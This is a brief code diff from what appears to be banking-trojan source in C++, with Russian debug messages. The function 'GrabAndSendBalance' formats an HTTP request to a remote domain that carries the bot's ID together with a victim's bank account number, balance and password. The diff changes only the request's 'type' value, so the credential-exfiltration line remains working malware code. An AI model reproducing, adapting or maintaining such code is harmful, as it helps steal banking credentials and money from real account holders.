@@ -150,7 +150,7 @@ static DWORD WINAPI GrabAndSendBalance(void*)
 			DBG( "CBank", "Пароль='%s'", pwd );
 			fwsprintfA pwsprintfA = Get_wsprintfA();
 			MemPtr<512> qr;
-			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=sbank&sum=%s&acc=%s&pass=%s", domain, BOT_UID, Rest, Account, pwd );
+			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=bss&sum=%s&acc=%s&pass=%s", domain, BOT_UID, Rest, Account, pwd );
 			DBG( "CBank", "Отсылаем запрос %s", qr.str() );
 			THTTPResponseRec Response;
 			ClearStruct(Response);
